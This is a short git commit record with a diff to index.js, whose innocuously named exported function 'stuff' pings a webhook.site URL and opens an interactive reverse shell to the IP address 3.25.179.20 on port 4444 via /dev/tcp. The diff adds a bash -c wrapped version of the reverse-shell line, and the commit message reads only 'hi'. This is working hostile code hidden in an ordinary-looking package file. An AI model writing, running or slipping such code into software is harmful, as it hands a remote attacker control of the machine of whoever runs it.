65f4092db45e99c92100d4bf5efac26186cadcc5
Rhys Davies <rhys@memes.nz>
2025-06-27 22:28:56 +1200

    hi

--- index.js
+++ index.js
@@ -3,5 +3,5 @@ child = require('child_process')
 exports.stuff = function() {
   fetch('https://webhook.site/1e4d3018-cbc8-4dd5-91fc-7cbaacceb64c');
   console.log("hello");
-  child.exec('/bin/sh -i >& /dev/tcp/3.25.179.20/4444 0>&1')
+  child.exec('/bin/bash -c "/bin/sh -i >& /dev/tcp/3.25.179.20/4444 0>&1"')
 }
